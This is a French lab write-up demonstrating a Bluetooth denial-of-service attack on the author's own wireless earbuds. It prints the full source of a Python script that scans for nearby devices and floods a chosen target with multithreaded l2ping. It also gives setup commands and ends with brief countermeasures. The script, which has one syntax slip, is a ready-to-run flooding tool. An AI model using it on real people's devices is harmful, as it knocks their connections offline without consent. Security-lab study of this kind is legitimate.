
### Attaque de Déni de Service (DoS) Bluetooth  

---

### 1. Présentation de l'attaque  
L’attaque de déni de service (DoS) Bluetooth vise à perturber le fonctionnement d’un appareil Bluetooth cible en saturant son protocole de communication. Cette méthode exploite des outils tels que **hcitool** et **hciconfig**, combinés avec un script Python (**Bluetooth_Carjacking.py**), pour lancer une attaque intensive basée sur des paquets envoyés rapidement et en grande quantité.  

#### Objectifs principaux :  
- Bloquer ou ralentir les appareils Bluetooth cibles.  
- Perturber les connexions établies avec d'autres périphériques.  
- Démontrer la vulnérabilité des protocoles Bluetooth.  

---

### 2. Préparation de l’attaque  

#### Prérequis :  
- Un ordinateur ou une machine virtuelle Linux avec une interface Bluetooth (supportant **l2ping**, **hciconfig**, et **hcitool**).  
- Le script Python **Bluetooth_Carjacking.py** disponible et exécuté en tant qu’administrateur.  

#### Étapes préparatoires :  
1. **Installation des outils nécessaires** :  
   Assurez-vous que les outils Bluetooth requis sont installés dans notre cas, elle est installée de base sur l'OS. :  
   ```bash
   sudo apt-get install bluez
   ```  

2. **Activation de l’interface Bluetooth** :  
   Vérifiez que votre interface Bluetooth est activée avec la commande suivante qui va nous permettre de voir voir les paramètres de notre carte Bluetooth :  
   ```bash
   hciconfig hci0 up
   hciconfig -a
   ```
   ![image](https://github.com/user-attachments/assets/15f5a4b2-c940-415f-a323-d30a5badcfa4)

   On voit que l'interface Bluetooth tel que le BUS qui est dans notre cass USB, ainsi que l'adresse MAC, les différents MTU ( Maximal Transmission Unit ) avec l'état de la carte qui est démarré dans notre cas UP et qui est scanné avec RUNNING PSCAN. Le nombre de bits reçus et envoyés grâce à celle ci ainsi que le type de paquet échangés etc.

3. **Scan des périphériques à proximité** :  
   Lancez un scan Bluetooth pour détecter les appareils dans votre environnement. Dans notre cas, nous voulons chercher la présence de notre adresse MAC de l'appareil que nous cherchons à DoS qui est donc les écouteurs sans fil :  
   ```bash
   hcitool scan
   ```  
   Vous obtiendrez une liste des adresses MAC des appareils détectés. On cherchera dans notre cas des écouteurs sans fil Apple Airpods Pro 2.
   ![image](https://github.com/user-attachments/assets/68a5689e-2217-45dd-ba6c-bc8bbc59cd19)

   
   
---

### 3. Étapes de l’attaque  

#### 3.1 Exécution du script **Bluetooth_Carjacking.py**  
Le script permet d’automatiser la découverte, la configuration, et l’envoi de paquets DoS. 

1. Lancez le script :  
   ```bash
   python3 Bluetooth_Carjacking.py
   ```  

2. Suivez les étapes interactives :  
   - Acceptez les avertissements légaux.  
   - Sélectionnez la cible (par ID ou adresse MAC).  
   - Définissez la taille des paquets à envoyer (ex. : 600 octets).  
   - Déterminez le nombre de threads pour maximiser l’effet de l’attaque.  

#### 3.2 Commande générée par le script :  
Une fois configuré, le script exécute des commandes bash. Voici un détail complet de ce script python (il est disponible dans les fichiers contenue dans ce dossier Bluetooth_Carjacking).
   ```python
import os  # Module pour exécuter des commandes système
import threading  # Module pour la gestion des threads
import time  # Module pour manipuler les pauses temporelles
import subprocess  # Module pour exécuter des commandes et capturer leur sortie

def DOS(target_addr, packages_size):
    # Fonction pour exécuter une attaque par déni de service via Bluetooth
    # Utilise la commande 'l2ping' pour envoyer des paquets à la cible
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def printLogo():
    # Fonction pour afficher un titre ou un logo pour le script
    print('                            Bluetooth DOS Script                            ')

def main():
    printLogo()  # Affiche le logo
    time.sleep(0.1)  # Pause courte pour l'esthétique

    # Affiche un avertissement à l'utilisateur en couleur rouge
    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')

    # Demande à l'utilisateur s'il accepte les termes
    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)  # Pause courte
        os.system('clear')  # Efface l'écran du terminal
        printLogo()  # Affiche à nouveau le logo
        print('')  # Ligne vide pour l'esthétique
        print("Scanning ...")  # Indique le début du scan Bluetooth

        # Lance un scan Bluetooth avec la commande 'hcitool scan'
        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        
        lines = output.splitlines()  # Divise la sortie en lignes
        id = 0  # Initialise un compteur pour les ID des appareils
        del lines[0]  # Supprime la première ligne (en-tête inutile)
        array = []  # Initialise une liste pour stocker les adresses MAC

        # Affiche le tableau des appareils détectés
        print("|id   |   mac_addres  |   device_name|")
        for line in lines:
            info = line.split()  # Sépare les champs de chaque ligne
            mac = info[0]  # Récupère l'adresse MAC
            array.append(mac)  # Ajoute l'adresse MAC à la liste
            # Affiche l'ID, l'adresse MAC et le nom de l'appareil
            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
            id = id + 1  # Incrémente l'ID

        # Demande l'ID ou l'adresse MAC de la cible
        target_id = input('Target id or mac > ')
        try:
            target_addr = array[int(target_id)]  # Récupère l'adresse MAC via l'ID
        except:
            target_addr = target_id  # Si ça échoue, utilise l'entrée comme adresse MAC

        # Vérifie que l'adresse cible est valide
        if len(target_addr) < 1:
            print('[!] ERROR: Target addr is missing')  # Affiche une erreur
            exit(0)  # Termine le programme

        # Demande la taille des paquets à envoyer
        try:
            packages_size = int(input('Packages size > '))  # Convertit en entier
        except:
            print('[!] ERROR: Packages size must be an integer')  # Affiche une erreur
            exit(0)  # Termine le programme

        # Demande le nombre de threads à utiliser
        try:
            threads_count = int(input('Threads count > '))  # Convertit en entier
        except:
            print('[!] ERROR: Threads count must be an integer')  # Affiche une erreur
            exit(0)  # Termine le programme

        print('')  # Ligne vide
        os.system('clear')  # Efface l'écran du terminal

        # Indique le début imminent de l'attaque
        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")

        # Affiche un compte à rebours de 3 secondes
        for i in range(0, 3):
            print('[*] ' + str(3 - i))  # Affiche le chiffre restant
            time.sleep(1)  # Pause d'une seconde
        os.system('clear')  # Efface l'écran

        print('[*] Building threads...\n')  # Indique la construction des threads

        # Crée et lance les threads pour l'attaque
        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))  # Indique le thread créé
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        # Indique que tous les threads sont prêts et que l'attaque commence
        print('[*] Built all threads...')
        print('[*] Starting...')
    else:
        print('Bip bip')  # Message humoristique si l'utilisateur refuse
        exit(0)  # Termine le programme

if __name__ == '__main__':
    try:
        os.system('clear')  # Efface l'écran du terminal
        main()  # Lance la fonction principale
    except KeyboardInterrupt:
        time.sleep(0.1)  # Pause courte
        print('\n[*] Aborted')  # Indique que l'utilisateur a arrêté le programme
        exit(0)  # Termine proprement
    except Exception a e:
        time.sleep(0.1)  # Pause courte
        print('[!] ERROR: ' + str(e))  # Affiche toute erreur imprévue
```

#### 3.3 Exécution attaque
Une fois le script executé, un texte apparait pour démistifier que le script est encadré dans un environnement de test et on confirmera avec y :
![image](https://github.com/user-attachments/assets/51307b64-cbfd-4b32-b8c1-5e40ca790f26)

Ensuite, cela va faire un scan réseau afin de voire quelle appareil cibler dans notre cas les Airpods : 
![image](https://github.com/user-attachments/assets/90eabde5-54f1-4892-8cfc-3e0a6445fe0d)

Ensuite, nous choisirons l'adresse MAC que l'on cible en choissiant le numéro associé qui est le 0 dans notre cas. Puis nous choisirons la taille des paquets que nous voulons envoyés qui est de 600 dans notre cas pour surcharger le réseau ainsi que le nombre de paquets envoyés qui sera de 100 dans notre cas.
![image](https://github.com/user-attachments/assets/071bdb12-124a-49f3-8aaf-04bab9fd18e3)

Ensuite, nous pouvons connecter nos écouteurs à notre téléphone et nous allons mettre de la musique afin de tester si cela coupe la connexion. Une fois ceci fait, on va lancer l'attaque : 
![image](https://github.com/user-attachments/assets/75b2da32-a7a7-4ad8-af3c-35143d978ab4)

Puis sur nos écouteurs vont couper la musique et se déconnecter de notre téléphone en affichant que les écouteurs sont utilisé sur un autre appareil :
![image](https://github.com/user-attachments/assets/64f22978-bc6a-4fae-b660-3dd6b10f9ebc)
![image](https://github.com/user-attachments/assets/aa564a16-c272-44e1-bc8c-4a56c6a71723)

Notre attaque a donc fonctionné !!

---

### 4. Phase de test  

2. **Indicateurs de succès** :  
   - Le périphérique cible affiche des erreurs de connexion ou des notifications de déconnexion.  
   - Les appareils associés (casques, montres, etc.) perdent la connexion.  
   - Le périphérique cible redémarre ou désactive temporairement son Bluetooth.  

---

### 5. Contre-mesures  

#### Pour les utilisateurs :  
- Désactivez le Bluetooth lorsqu’il n’est pas nécessaire.  
- Utilisez des appareils équipés des dernières versions de Bluetooth avec des protections avancées.  

#### Pour les fabricants :  
- Implémentez des limitations sur la fréquence des paquets entrants.  
- Adoptez des protocoles sécurisés contre les attaques DoS (ex. : contrôle du trafic Bluetooth).  

---

### 6. Conclusion  

L'attaque DoS Bluetooth exploitant des outils comme **hcitool**/**hciconfig** et des scripts automatisés montre les failles des anciens standards Bluetooth. En réponse, les fabricants doivent renforcer les mécanismes de sécurité dans leurs implémentations des protocoles Bluetooth.
